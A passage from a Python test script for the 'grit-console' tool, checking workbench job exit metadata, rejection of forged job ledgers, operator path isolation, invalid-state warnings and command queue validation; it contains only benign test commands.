        if (not any(
                    event.get("event") == "workbench_job_started" and
                    event.get("details", {}).get("job_id") == job_id and
                    "--start-workbench-job package-artifact" in event.get("details", {}).get("headless_command", "") and
                    "--job-command " in event.get("details", {}).get("headless_command", "")
                    for event in job_events) or
                not any(
                    event.get("event") == "workbench_job_cancel_requested" and
                    event.get("details", {}).get("job_id") == job_id and
                    f"--cancel-workbench-job {job_id}" in event.get("details", {}).get("headless_command", "")
                    for event in job_events)):
            print("workbench background job events missing", file=sys.stderr)
            print(json.dumps(job_events[-8:], indent=2, sort_keys=True), file=sys.stderr)
            return 1

        quick_job = run(
            "scripts/grit-console",
            "--config", str(workbench_job_cfg),
            "--start-workbench-job", "bringup-recommend",
            "--job-command", "printf 'quick job done\\n'; exit 7",
        )
        if quick_job.returncode != 0 or "started workbench job" not in quick_job.stdout:
            print("quick workbench background job did not start", file=sys.stderr)
            print(quick_job.stdout, file=sys.stderr)
            print(quick_job.stderr, file=sys.stderr)
            return 1
        quick_job_id = ""
        for token in quick_job.stdout.replace(":", " ").split():
            if token.startswith("job-"):
                quick_job_id = token
                break
        if not quick_job_id:
            print("quick workbench background job id missing", file=sys.stderr)
            print(quick_job.stdout, file=sys.stderr)
            return 1
        quick_status = None
        for _ in range(30):
            quick_status_doc = run(
                "scripts/grit-console",
                "--config", str(workbench_job_cfg),
                "--json-status",
            )
            quick_status = json.loads(quick_status_doc.stdout)
            quick = (quick_status.get("workbench_jobs_by_id") or {}).get(quick_job_id) or {}
            if quick.get("exit_status_known") is True:
                break
            time.sleep(0.1)
        quick = (quick_status.get("workbench_jobs_by_id") or {}).get(quick_job_id) or {}
        quick_service_manager_state = (quick_status.get("service_manager_state_records_by_id") or {}).get("service-manager") or {}
        if (quick.get("effective_state") != "exited" or
                quick.get("exit_status") != 7 or
                quick.get("outcome") != "failed" or
                quick.get("finished_at", "") == "" or
                quick.get("completed_event_at", "") == "" or
                quick.get("started_at_known") is not True or
                quick.get("finished_at_known") is not True or
                quick.get("duration_known") is not True or
                quick.get("elapsed_known") is not True or
                quick.get("last_output_tail", [])[-1:] != ["quick job done"] or
                quick_status.get("summary", {}).get("workbench_job_exit_status_known_count", 0) < 1 or
                quick_status.get("summary", {}).get("workbench_job_started_at_known_count", 0) < 2 or
                quick_status.get("summary", {}).get("workbench_job_finished_at_known_count", 0) < 1 or
                quick_status.get("summary", {}).get("workbench_job_duration_known_count", 0) < 1 or
                quick_status.get("summary", {}).get("workbench_job_elapsed_known_count", 0) < 2 or
                (quick_status.get("service_manager") or {}).get("shutdown_requested") is not False or
                (quick_status.get("service_manager") or {}).get("socket_count") != quick_status.get("summary", {}).get("service_manager_socket_count") or
                (quick_status.get("service_manager") or {}).get("open_socket_count") != quick_status.get("summary", {}).get("service_manager_open_socket_count") or
                (quick_status.get("service_manager") or {}).get("transport_count") != quick_status.get("summary", {}).get("service_manager_transport_count") or
                (quick_status.get("service_manager") or {}).get("thread_count") != quick_status.get("summary", {}).get("service_manager_thread_count") or
                (quick_status.get("service_manager") or {}).get("child_process_count") != quick_status.get("summary", {}).get("service_manager_child_process_count") or
                quick_service_manager_state.get("id") != "service-manager" or
                quick_service_manager_state.get("shutdown_requested") is not False or
                quick_service_manager_state.get("resource_count") != len(quick_status.get("service_manager_resources") or []) or
                quick_status.get("summary", {}).get("service_manager_state_record_count") != 1 or
                quick_status.get("summary", {}).get("service_manager_has_resources") != bool(quick_service_manager_state.get("has_resources")) or
                (quick_status.get("api_collections") or {}).get("service_manager_state_records", {}).get("count") != 1 or
                "service_manager_state_records_by_has_resources" not in (((quick_status.get("api_collections") or {}).get("service_manager_state_records") or {}).get("indexes") or []) or
                len(quick_status.get("service_manager_resources") or []) != quick_status.get("summary", {}).get("service_manager_resource_count") or
                (quick_status.get("api_collections") or {}).get("service_manager_resources", {}).get("count") != quick_status.get("summary", {}).get("service_manager_resource_count") or
                "service_manager_resources_by_kind_state" not in (((quick_status.get("api_collections") or {}).get("service_manager_resources") or {}).get("indexes") or []) or
                quick_status.get("summary", {}).get("workbench_job_outcome_counts", {}).get("failed", 0) < 1 or
                quick_status.get("summary", {}).get("workbench_job_exit_status_counts", {}).get("7", 0) < 1 or
                quick_status.get("summary", {}).get("event_detail_job_id_counts", {}).get(quick_job_id, 0) < 1 or
                quick_status.get("summary", {}).get("event_type_detail_job_id_counts", {}).get(f"workbench_job_completed:{quick_job_id}", 0) != 1 or
                quick_status.get("summary", {}).get("event_service_detail_job_id_counts", {}).get(f"workbench:{quick_job_id}", 0) < 1 or
                quick_status.get("summary", {}).get("event_detail_action_id_counts", {}).get("bringup-recommend", 0) < 1 or
                quick_status.get("summary", {}).get("event_type_detail_action_id_counts", {}).get("workbench_job_completed:bringup-recommend", 0) != 1 or
                quick_status.get("summary", {}).get("event_service_detail_action_id_counts", {}).get("workbench:bringup-recommend", 0) < 1 or
                (quick_status.get("workbench_jobs_by_duration_known") or {}).get("True", [{}])[-1].get("id") != quick_job_id or
                (quick_status.get("workbench_jobs_by_finished_at_known") or {}).get("True", [{}])[-1].get("id") != quick_job_id or
                (quick_status.get("workbench_jobs_by_outcome") or {}).get("failed", [{}])[-1].get("id") != quick_job_id or
                (quick_status.get("workbench_jobs_by_exit_status") or {}).get("7", [{}])[-1].get("id") != quick_job_id or
                (quick_status.get("event_log_stats") or {}).get("by_event", {}).get("workbench_job_completed", 0) != 1 or
                (quick_status.get("event_log_stats") or {}).get("by_detail_job_id", {}).get(quick_job_id, 0) < 1 or
                (quick_status.get("event_log_stats") or {}).get("by_detail_action_id", {}).get("bringup-recommend", 0) < 1 or
                (quick_status.get("events_by_detail_job_id") or {}).get(quick_job_id, [{}])[-1].get("details", {}).get("job_id") != quick_job_id or
                (quick_status.get("events_by_detail_action_id") or {}).get("bringup-recommend", [{}])[-1].get("details", {}).get("action_id") != "bringup-recommend" or
                (quick_status.get("events_by_event_detail_job_id") or {}).get(f"workbench_job_completed:{quick_job_id}", [{}])[-1].get("event") != "workbench_job_completed" or
                (quick_status.get("events_by_service_detail_job_id") or {}).get(f"workbench:{quick_job_id}", [{}])[-1].get("details", {}).get("job_id") != quick_job_id or
                (quick_status.get("events_by_event_detail_action_id") or {}).get("workbench_job_completed:bringup-recommend", [{}])[-1].get("event") != "workbench_job_completed" or
                (quick_status.get("events_by_service_detail_action_id") or {}).get("workbench:bringup-recommend", [{}])[-1].get("details", {}).get("action_id") != "bringup-recommend" or
                "events_by_detail_job_id" not in (((quick_status.get("api_collections") or {}).get("events") or {}).get("indexes") or []) or
                "events_by_event_detail_job_id" not in (((quick_status.get("api_collections") or {}).get("events") or {}).get("indexes") or []) or
                "events_by_service_detail_job_id" not in (((quick_status.get("api_collections") or {}).get("events") or {}).get("indexes") or []) or
                "events_by_detail_action_id" not in (((quick_status.get("api_collections") or {}).get("events") or {}).get("indexes") or []) or
                "events_by_event_detail_action_id" not in (((quick_status.get("api_collections") or {}).get("events") or {}).get("indexes") or []) or
                "events_by_service_detail_action_id" not in (((quick_status.get("api_collections") or {}).get("events") or {}).get("indexes") or [])):
            print("completed workbench background job missing exit metadata", file=sys.stderr)
            print(json.dumps(quick_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        quick_text = run(
            "scripts/grit-console",
            "--config", str(workbench_job_cfg),
            "--status",
        )
        if ("exit_status=7 outcome=failed" not in quick_text.stdout or
                "exit_status_known=" not in quick_text.stdout or
                "duration_known=" not in quick_text.stdout or
                "elapsed_known=" not in quick_text.stdout or
                "duration_sec=" not in quick_text.stdout or
                "managed=" not in quick_text.stdout or
                "background=" not in quick_text.stdout or
                "long_running=" not in quick_text.stdout or
                "runtime_manager: shutdown=no reason=-" not in quick_text.stdout or
                "resources=" not in quick_text.stdout or
                "cancel: disabled; process is not alive" not in quick_text.stdout or
                "outcomes:" not in quick_text.stdout):
            print("text status missing completed workbench job exit metadata", file=sys.stderr)
            print(quick_text.stdout, file=sys.stderr)
            return 1
        quick_events = [
            json.loads(line)
            for line in (workbench_job_dir / "events.jsonl").read_text(encoding="utf-8").splitlines()
        ]
        completion_events = [
            event for event in quick_events
            if event.get("event") == "workbench_job_completed" and event.get("details", {}).get("job_id") == quick_job_id
        ]
        if (len(completion_events) != 1 or
                completion_events[0].get("details", {}).get("exit_status") != 7 or
                completion_events[0].get("details", {}).get("outcome") != "failed"):
            print("completed workbench background job event missing or duplicated", file=sys.stderr)
            print(json.dumps(quick_events, indent=2, sort_keys=True), file=sys.stderr)
            return 1

        forged_dir = Path(tmp) / "operator-session-forged-job"
        forged_cfg = Path(tmp) / "server-config-forged-job.json"
        forged_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "operator_session_dir": str(forged_dir),
            "session_root": str(Path(tmp) / "sessions-forged-job"),
        }), encoding="utf-8")
        forged_dir.mkdir(parents=True, exist_ok=True)
        (forged_dir / "workbench-jobs.json").write_text(json.dumps({
            "schema": 1,
            "jobs": [{
                "id": "job-forged",
                "action_id": "package-artifact",
                "state": "running",
                "pid": os.getpid(),
                "managed_by": "grit-console-workbench",
                "started_at": "2026-01-01T00:00:00Z",
            }],
        }), encoding="utf-8")
        forged_status = json.loads(run(
            "scripts/grit-console",
            "--config", str(forged_cfg),
            "--json-status",
        ).stdout)
        forged_job = (forged_status.get("workbench_jobs_by_id") or {}).get("job-forged") or {}
        if forged_job.get("cancel_supported") is not False or forged_job.get("pid_managed") is not False:
            print("forged workbench job ledger was treated as cancellable", file=sys.stderr)
            print(json.dumps(forged_status, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        forged_text = run(
            "scripts/grit-console",
            "--config", str(forged_cfg),
            "--status",
        )
        if ("job job-forged" not in forged_text.stdout or
                "managed=no cancel_supported=no" not in forged_text.stdout or
                "ownership: ledger:managed-by-workbench" not in forged_text.stdout or
                "cancel: disabled; ownership unverified" not in forged_text.stdout):
            print("text status missing forged workbench job ownership warning", file=sys.stderr)
            print(forged_text.stdout, file=sys.stderr)
            return 1
        forged_cancel = run(
            "scripts/grit-console",
            "--config", str(forged_cfg),
            "--cancel-workbench-job", "job-forged",
        )
        if forged_cancel.returncode == 0 or "not cancellable" not in (forged_cancel.stdout + forged_cancel.stderr):
            print("forged workbench job cancellation was not rejected", file=sys.stderr)
            print(forged_cancel.stdout, file=sys.stderr)
            print(forged_cancel.stderr, file=sys.stderr)
            return 1

        isolated_operator_dir = Path(tmp) / "isolated-operator-session"
        isolated_cfg = Path(tmp) / "server-config-isolated-operator-dir.json"
        isolated_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "operator_session_dir": str(isolated_operator_dir),
            "session_root": str(Path(tmp) / "isolated-sessions"),
        }), encoding="utf-8")
        isolated_status = run(
            "scripts/grit-console",
            "--config", str(isolated_cfg),
            "--json-status",
        )
        isolated_doc = json.loads(isolated_status.stdout)
        isolated_paths = isolated_doc.get("paths") or {}
        expected_isolated = {
            "state_file": isolated_operator_dir / "server-state.json",
            "staged_files": isolated_operator_dir / "staged-files.json",
            "command_queue_file": isolated_operator_dir / "command-queue.json",
            "command_copy_file": isolated_operator_dir / "last-command.txt",
            "event_log": isolated_operator_dir / "events.jsonl",
        }
        if any(isolated_paths.get(key) != str(path) for key, path in expected_isolated.items()):
            print("operator_session_dir did not derive isolated operator paths", file=sys.stderr)
            print(isolated_status.stdout, file=sys.stderr)
            return 1
        isolated_workbench = run(
            "scripts/grit-console",
            "--config", str(isolated_cfg),
        )
        if (str(expected_isolated["staged_files"]) not in isolated_workbench.stdout or
                str(expected_isolated["command_queue_file"]) not in isolated_workbench.stdout or
                str(expected_isolated["command_copy_file"]) not in isolated_workbench.stdout):
            print("workbench did not show isolated operator paths", file=sys.stderr)
            print(isolated_workbench.stdout, file=sys.stderr)
            return 1

        mismatched_copy_path = Path(tmp) / "command-copy-is-directory"
        mismatched_copy_path.mkdir()
        path_mismatch_cfg = Path(tmp) / "server-config-path-mismatch.json"
        path_mismatch_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "operator_session_dir": str(Path(tmp) / "operator-session-path-mismatch"),
            "session_root": str(Path(tmp) / "path-mismatch-sessions"),
            "command_copy_file": str(mismatched_copy_path),
        }), encoding="utf-8")
        path_mismatch_status = run(
            "scripts/grit-console",
            "--config", str(path_mismatch_cfg),
            "--json-status",
        )
        path_mismatch_doc = json.loads(path_mismatch_status.stdout)
        path_mismatch_rec = (path_mismatch_doc.get("path_status") or {}).get("command_copy_file") or {}
        path_mismatch_browser_rec = (
            path_mismatch_doc.get("browser_paths_by_path", {}).get(str(mismatched_copy_path)) or [{}]
        )[0]
        path_mismatch_warnings = [
            item for item in path_mismatch_doc.get("warnings", [])
            if item.get("type") == "operator_path_kind_mismatch"
        ]
        if (path_mismatch_rec.get("expected_kind") != "file" or
                path_mismatch_rec.get("expected_kind_mismatch") is not True or
                path_mismatch_rec.get("is_dir") is not True or
                path_mismatch_rec.get("warning_count") != 1 or
                "operator_path_kind_mismatch" not in path_mismatch_rec.get("warning_types", []) or
                path_mismatch_browser_rec.get("warning_count") != 1 or
                "operator_path_kind_mismatch" not in path_mismatch_browser_rec.get("warning_types", []) or
                path_mismatch_doc.get("summary", {}).get("path_kind_mismatch_count") != 1 or
                path_mismatch_doc.get("summary", {}).get("browser_path_kind_mismatch_count") != 1 or
                path_mismatch_doc.get("summary", {}).get("browser_path_kind_mismatch_counts", {}).get("command-copy") != 1 or
                path_mismatch_doc.get("summary", {}).get("browser_path_warning_count") != 1 or
                path_mismatch_doc.get("summary", {}).get("browser_path_warning_kind_counts", {}).get("command-copy") != 1 or
                path_mismatch_doc.get("summary", {}).get("browser_path_warning_type_counts", {}).get("operator_path_kind_mismatch") != 1 or
                path_mismatch_doc.get("browser_path_summary", {}).get("warning_count") != 1 or
                path_mismatch_doc.get("browser_path_summary", {}).get("warning_by_kind", {}).get("command-copy") != 1 or
                not path_mismatch_warnings or
                path_mismatch_warnings[-1].get("path_name") != "command_copy_file" or
                path_mismatch_warnings[-1].get("path") != str(mismatched_copy_path) or
                path_mismatch_doc.get("summary", {}).get("warning_type_counts", {}).get("operator_path_kind_mismatch") != 1 or
                path_mismatch_doc.get("summary", {}).get("warning_path_counts", {}).get(str(mismatched_copy_path)) != 1 or
                path_mismatch_doc.get("summary", {}).get("warning_type_path_counts", {}).get(f"operator_path_kind_mismatch:{mismatched_copy_path}") != 1 or
                path_mismatch_doc.get("warnings_by_path", {}).get(str(mismatched_copy_path), [{}])[-1].get("type") != "operator_path_kind_mismatch" or
                path_mismatch_doc.get("warnings_by_type_path", {}).get(f"operator_path_kind_mismatch:{mismatched_copy_path}", [{}])[-1].get("path") != str(mismatched_copy_path)):
            print("server json status missing operator path kind mismatch warning", file=sys.stderr)
            print(path_mismatch_status.stdout, file=sys.stderr)
            return 1
        path_mismatch_text = run(
            "scripts/grit-console",
            "--config", str(path_mismatch_cfg),
            "--status",
        )
        if ("operator path kind mismatch:" not in path_mismatch_text.stdout or
                f"{mismatched_copy_path} expected=file actual=dir" not in path_mismatch_text.stdout):
            print("text --status missing operator path kind mismatch warning", file=sys.stderr)
            print(path_mismatch_text.stdout, file=sys.stderr)
            return 1

        invalid_state_dir = Path(tmp) / "operator-session-invalid-state"
        invalid_state_dir.mkdir()
        invalid_state_file = invalid_state_dir / "server-state.json"
        invalid_staged_file = invalid_state_dir / "staged-files.json"
        invalid_queue_file = invalid_state_dir / "command-queue.json"
        invalid_state_file.write_text("{not-json\n", encoding="utf-8")
        invalid_staged_file.write_text("[]\n", encoding="utf-8")
        invalid_queue_file.write_text('{"schema":1,"commands":{}}\n', encoding="utf-8")
        invalid_state_cfg = Path(tmp) / "server-config-invalid-state.json"
        invalid_state_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "operator_session_dir": str(invalid_state_dir),
            "server_state": str(invalid_state_file),
            "staged_files": str(invalid_staged_file),
            "command_queue_file": str(invalid_queue_file),
            "session_root": str(Path(tmp) / "invalid-state-sessions"),
        }), encoding="utf-8")
        invalid_state_status = run(
            "scripts/grit-console",
            "--config", str(invalid_state_cfg),
            "--json-status",
        )
        invalid_state_doc = json.loads(invalid_state_status.stdout)
        invalid_state_path_status = invalid_state_doc.get("path_status") or {}
        invalid_state_browser_by_path = invalid_state_doc.get("browser_paths_by_path") or {}
        invalid_warning_types = invalid_state_doc.get("summary", {}).get("warning_type_counts", {})
        invalid_warning_paths = invalid_state_doc.get("summary", {}).get("warning_path_counts", {})
        invalid_warning_type_paths = invalid_state_doc.get("summary", {}).get("warning_type_path_counts", {})
        invalid_warnings_by_type = invalid_state_doc.get("warnings_by_type") or {}
        invalid_warnings_by_path = invalid_state_doc.get("warnings_by_path") or {}
        invalid_warnings_by_type_path = invalid_state_doc.get("warnings_by_type_path") or {}
        invalid_path_api = (invalid_state_doc.get("api_collections") or {}).get("path_status_records") or {}
        invalid_browser_api = (invalid_state_doc.get("api_collections") or {}).get("browser_paths") or {}
        invalid_operator_state_api = (invalid_state_doc.get("api_collections") or {}).get("operator_state_records") or {}
        invalid_command_queue_state_api = (invalid_state_doc.get("api_collections") or {}).get("command_queue_state_records") or {}
        invalid_operator_state_by_name = invalid_state_doc.get("operator_state_records_by_name") or {}
        invalid_operator_state_by_status = invalid_state_doc.get("operator_state_records_by_status") or {}
        invalid_operator_state_by_kind_status = invalid_state_doc.get("operator_state_records_by_kind_status") or {}
        invalid_operator_state_by_unhealthy = invalid_state_doc.get("operator_state_records_by_unhealthy") or {}
        invalid_operator_state_by_action = invalid_state_doc.get("operator_state_records_by_requires_operator_action") or {}
        invalid_operator_state_by_remediation = invalid_state_doc.get("operator_state_records_by_remediation_class") or {}
        if (invalid_state_doc.get("summary", {}).get("server_state_valid") is not False or
                invalid_state_doc.get("summary", {}).get("staged_files_valid") is not False or
                invalid_state_doc.get("summary", {}).get("command_queue_file_valid") is not False or
                invalid_state_doc.get("summary", {}).get("operator_state_count") != len(invalid_state_doc.get("operator_state_records") or []) or
                invalid_state_doc.get("summary", {}).get("operator_state_status_counts", {}).get("invalid") != 3 or
                invalid_state_doc.get("summary", {}).get("operator_state_invalid_count") != 3 or
                invalid_state_doc.get("summary", {}).get("operator_state_missing_count") != 4 or
                invalid_state_doc.get("summary", {}).get("operator_state_unhealthy_count") != 7 or
                invalid_state_doc.get("summary", {}).get("operator_state_ok_count") != 0 or
                invalid_state_doc.get("summary", {}).get("operator_state_error_count") != 0 or
                invalid_state_doc.get("summary", {}).get("operator_state_severity_counts", {}).get("error") != 3 or
                invalid_state_doc.get("summary", {}).get("operator_state_severity_counts", {}).get("warning") != 4 or
                invalid_state_doc.get("summary", {}).get("operator_state_remediation_class_counts", {}).get("repair_operator_state") != 3 or
                invalid_state_doc.get("summary", {}).get("operator_state_remediation_class_counts", {}).get("initialize_operator_state") != 4 or
                invalid_state_doc.get("summary", {}).get("operator_state_requires_operator_action_counts", {}).get("True") != 3 or
                invalid_state_doc.get("summary", {}).get("operator_state_requires_operator_action_counts", {}).get("False") != 4 or
                invalid_state_doc.get("summary", {}).get("operator_state_kind_status_counts", {}).get("json-state:invalid") != 3 or
                invalid_warning_types.get("invalid_server_state") != 1 or
                invalid_warning_types.get("invalid_staged_files_state") != 1 or
                invalid_warning_types.get("invalid_command_queue_state") != 1 or
                invalid_warning_paths.get(str(invalid_state_file)) != 1 or
                invalid_warning_paths.get(str(invalid_staged_file)) != 1 or
                invalid_warning_paths.get(str(invalid_queue_file)) != 1 or
                invalid_warning_type_paths.get(f"invalid_server_state:{invalid_state_file}") != 1 or
                invalid_warning_type_paths.get(f"invalid_staged_files_state:{invalid_staged_file}") != 1 or
                invalid_warning_type_paths.get(f"invalid_command_queue_state:{invalid_queue_file}") != 1 or
                invalid_state_path_status.get("state_file", {}).get("warning_count") != 1 or
                invalid_state_path_status.get("staged_files", {}).get("warning_count") != 1 or
                invalid_state_path_status.get("command_queue_file", {}).get("warning_count") != 1 or
                "invalid_server_state" not in invalid_state_path_status.get("state_file", {}).get("warning_types", []) or
                "invalid_staged_files_state" not in invalid_state_path_status.get("staged_files", {}).get("warning_types", []) or
                "invalid_command_queue_state" not in invalid_state_path_status.get("command_queue_file", {}).get("warning_types", []) or
                invalid_state_doc.get("path_status_by_has_warnings", {}).get("yes", [{}])[0].get("name") != "state_file" or
                invalid_state_doc.get("path_status_by_warning_type", {}).get("invalid_server_state", [{}])[0].get("name") != "state_file" or
                invalid_state_doc.get("summary", {}).get("path_warning_count") != 3 or
                invalid_state_doc.get("summary", {}).get("path_warning_type_counts", {}).get("invalid_server_state") != 1 or
                invalid_state_browser_by_path.get(str(invalid_state_file), [{}])[0].get("warning_count") != 1 or
                invalid_state_browser_by_path.get(str(invalid_staged_file), [{}])[0].get("warning_count") != 1 or
                invalid_state_browser_by_path.get(str(invalid_queue_file), [{}])[0].get("warning_count") != 1 or
                invalid_state_doc.get("browser_paths_by_has_warnings", {}).get("yes", [{}])[0].get("path") != str(invalid_state_file) or
                invalid_state_doc.get("browser_paths_by_warning_type", {}).get("invalid_server_state", [{}])[0].get("path") != str(invalid_state_file) or
                invalid_state_doc.get("summary", {}).get("browser_path_warning_count") != 3 or
                invalid_state_doc.get("summary", {}).get("browser_path_warning_kind_counts", {}).get("server-state") != 1 or
                invalid_state_doc.get("summary", {}).get("browser_path_warning_kind_counts", {}).get("staged-ledger") != 1 or
                invalid_state_doc.get("summary", {}).get("browser_path_warning_kind_counts", {}).get("command-queue-ledger") != 1 or
                invalid_state_doc.get("summary", {}).get("browser_path_warning_type_counts", {}).get("invalid_server_state") != 1 or
                invalid_state_doc.get("browser_path_summary", {}).get("warning_count") != 3 or
                invalid_warnings_by_type.get("invalid_server_state", [{}])[0].get("path") != str(invalid_state_file) or
                invalid_warnings_by_type.get("invalid_staged_files_state", [{}])[0].get("path") != str(invalid_staged_file) or
                invalid_warnings_by_type.get("invalid_command_queue_state", [{}])[0].get("path") != str(invalid_queue_file) or
                invalid_operator_state_by_name.get("server_state", {}).get("status") != "invalid" or
                invalid_operator_state_by_name.get("staged_files", {}).get("status") != "invalid" or
                invalid_operator_state_by_name.get("command_queue", {}).get("status") != "invalid" or
                invalid_operator_state_by_name.get("server_state", {}).get("unhealthy") is not True or
                invalid_operator_state_by_name.get("session_root", {}).get("unhealthy") is not True or
                invalid_operator_state_by_name.get("server_state", {}).get("requires_operator_action") is not True or
                invalid_operator_state_by_name.get("session_root", {}).get("requires_operator_action") is not False or
                invalid_operator_state_by_name.get("server_state", {}).get("remediation_class") != "repair_operator_state" or
                invalid_operator_state_by_name.get("session_root", {}).get("remediation_class") != "initialize_operator_state" or
                invalid_operator_state_by_name.get("server_state", {}).get("severity") != "error" or
                invalid_operator_state_by_name.get("session_root", {}).get("severity") != "warning" or
                "repair" not in invalid_operator_state_by_name.get("server_state", {}).get("suggested_action", "") or
                len(invalid_operator_state_by_status.get("invalid") or []) != 3 or
                len(invalid_operator_state_by_unhealthy.get("True") or []) != 7 or
                len(invalid_operator_state_by_action.get("True") or []) != 3 or
                len(invalid_operator_state_by_remediation.get("repair_operator_state") or []) != 3 or
                len(invalid_operator_state_by_remediation.get("initialize_operator_state") or []) != 4 or
                len(invalid_operator_state_by_kind_status.get("json-state:invalid") or []) != 3 or
                invalid_warnings_by_path.get(str(invalid_state_file), [{}])[0].get("type") != "invalid_server_state" or
                invalid_warnings_by_path.get(str(invalid_staged_file), [{}])[0].get("type") != "invalid_staged_files_state" or
                invalid_warnings_by_path.get(str(invalid_queue_file), [{}])[0].get("type") != "invalid_command_queue_state" or
                invalid_warnings_by_type_path.get(f"invalid_server_state:{invalid_state_file}", [{}])[0].get("path") != str(invalid_state_file) or
                invalid_state_doc.get("command_queue_state_records_by_valid", {}).get("False", [{}])[0].get("path") != str(invalid_queue_file) or
                "path_status_by_has_warnings" not in (invalid_path_api.get("indexes") or []) or
                "path_status_by_warning_type" not in (invalid_path_api.get("indexes") or []) or
                "operator_state_records_by_status" not in (invalid_operator_state_api.get("indexes") or []) or
                "operator_state_records_by_unhealthy" not in (invalid_operator_state_api.get("indexes") or []) or
                "operator_state_records_by_remediation_class" not in (invalid_operator_state_api.get("indexes") or []) or
                "operator_state_records_by_requires_operator_action" not in (invalid_operator_state_api.get("indexes") or []) or
                "operator_state_records_by_kind_status" not in (invalid_operator_state_api.get("indexes") or []) or
                "command_queue_state_records_by_valid" not in (invalid_command_queue_state_api.get("indexes") or []) or
                "browser_paths_by_has_warnings" not in (invalid_browser_api.get("indexes") or []) or
                "browser_paths_by_warning_type" not in (invalid_browser_api.get("indexes") or [])):
            print("server json status missing invalid operator state warnings", file=sys.stderr)
            print(invalid_state_status.stdout, file=sys.stderr)
            return 1
        invalid_state_text = run(
            "scripts/grit-console",
            "--config", str(invalid_state_cfg),
            "--status",
        )
        if ("server-state ledger is invalid" not in invalid_state_text.stdout or
                "staged-files ledger is invalid" not in invalid_state_text.stdout or
                "command queue ledger is invalid" not in invalid_state_text.stdout or
                "Operator state:" not in invalid_state_text.stdout or
                "server_state: status=invalid kind=json-state" not in invalid_state_text.stdout or
                "staged_files: status=invalid kind=json-state" not in invalid_state_text.stdout or
                "command_queue: status=invalid kind=json-state" not in invalid_state_text.stdout):
            print("text --status missing invalid operator state warnings", file=sys.stderr)
            print(invalid_state_text.stdout, file=sys.stderr)
            return 1

        queue_file = queue_operator_dir / "command-queue.json"
        queued = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(queue_file),
            "--queue-command", "grit reality-test --json",
            "--queue-timeout", "9",
            "--queue-max-output", "1234",
        )
        if queued.returncode != 0 or "execution_supported=no" not in queued.stdout:
            print("operator command queue entry was not recorded safely", file=sys.stderr)
            print(queued.stdout, file=sys.stderr)
            print(queued.stderr, file=sys.stderr)
            return 1
        queue_doc = json.loads(queue_file.read_text(encoding="utf-8"))
        if (len(queue_doc.get("commands", [])) != 1 or
                queue_doc["commands"][0].get("command") != "grit reality-test --json" or
                queue_doc["commands"][0].get("execution_supported") is not False or
                queue_doc["commands"][0].get("delivery_supported") is not False):
            print("operator command queue JSON missing non-exec safety fields", file=sys.stderr)
            return 1
        bad_queue_timeout = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(queue_file),
            "--queue-command", "grit survey",
            "--queue-timeout", "0",
        )
        if bad_queue_timeout.returncode == 0 or "timeout must be a positive integer" not in bad_queue_timeout.stderr:
            print("operator command queue accepted invalid timeout", file=sys.stderr)
            print(bad_queue_timeout.stdout, file=sys.stderr)
            print(bad_queue_timeout.stderr, file=sys.stderr)
            return 1
        bad_queue_output = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(queue_file),
            "--queue-command", "grit survey",
            "--queue-max-output", "0",
        )
        if bad_queue_output.returncode == 0 or "max output must be a positive integer" not in bad_queue_output.stderr:
            print("operator command queue accepted invalid max output", file=sys.stderr)
            print(bad_queue_output.stdout, file=sys.stderr)
            print(bad_queue_output.stderr, file=sys.stderr)
            return 1
        bad_queue_expire = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(queue_file),
            "--queue-command", "grit survey",
            "--queue-expire-sec", "-1",
        )
        if bad_queue_expire.returncode == 0 or "expiration must be zero or a positive integer" not in bad_queue_expire.stderr:
            print("operator command queue accepted invalid expiration", file=sys.stderr)
            print(bad_queue_expire.stdout, file=sys.stderr)
            print(bad_queue_expire.stderr, file=sys.stderr)
            return 1
        queue_doc_after_bad = json.loads(queue_file.read_text(encoding="utf-8"))
        if len(queue_doc_after_bad.get("commands", [])) != 1:
            print("invalid command queue entries were persisted", file=sys.stderr)
            return 1
        unique_queue_file = Path(tmp) / "operator-session" / "unique-command-queue.json"
        unique_queue = subprocess.run(
            [
                sys.executable,
                "-c",
                (
                    "import importlib.machinery, importlib.util, json, pathlib, sys; "
                    "p=pathlib.Path(sys.argv[1]); "
                    "loader=importlib.machinery.SourceFileLoader('srv', str(p)); "
                    "spec=importlib.util.spec_from_loader('srv', loader); "
                    "m=importlib.util.module_from_spec(spec); spec.loader.exec_module(m); "
                    "cfg=m.load_config(sys.argv[2]); cfg['command_queue_file']=sys.argv[3]; "
                    "a=m.queue_command(cfg, 'grit survey'); "
                    "b=m.queue_command(cfg, 'grit survey'); "
                    "print(json.dumps([a['id'], b['id']]))"
                ),
                str(server),
                str(cfg),
                str(unique_queue_file),
            ],
            cwd=ROOT,
            text=True,
            capture_output=True,
        )
        if unique_queue.returncode != 0:
            print("same-process command queue uniqueness smoke failed", file=sys.stderr)
            print(unique_queue.stdout, file=sys.stderr)
            print(unique_queue.stderr, file=sys.stderr)
            return 1
        unique_ids = json.loads(unique_queue.stdout)
        if len(unique_ids) != 2 or unique_ids[0] == unique_ids[1]:
            print("same-process command queue entries received duplicate ids", file=sys.stderr)
            print(unique_queue.stdout, file=sys.stderr)
            return 1
        queue_list = run(
            "scripts/grit-console",
            "--config", str(cfg),
            "--command-queue-file", str(queue_file),
            "--json-command-queue",
        )
        queue_status = json.loads(queue_list.stdout)
        if queue_status["command_queue"]["queued_count"] != 1:
            print("json command queue listing missing queued entry", file=sys.stderr)
            return 1
        queue_summary = queue_status["command_queue"]
        queued_id = queue_summary["commands"][0]["id"]
        queued_policy = queue_summary["commands"][0].get("queue_policy_snapshot") or {}
        if (queue_summary.get("commands_by_id", {}).get(queued_id, {}).get("command") != "grit reality-test --json" or
                len(queue_summary.get("commands_by_status", {}).get("queued", [])) != 1 or
                queue_summary["commands_by_status"]["queued"][0].get("id") != queued_id or
                queue_summary.get("commands_by_timeout_sec", {}).get("9", [{}])[0].get("id") != queued_id or
                queue_summary.get("commands_by_max_output_bytes", {}).get("1234", [{}])[0].get("id") != queued_id or
                queue_summary.get("commands_by_expire_sec", {}).get("0", [{}])[0].get("id") != queued_id or
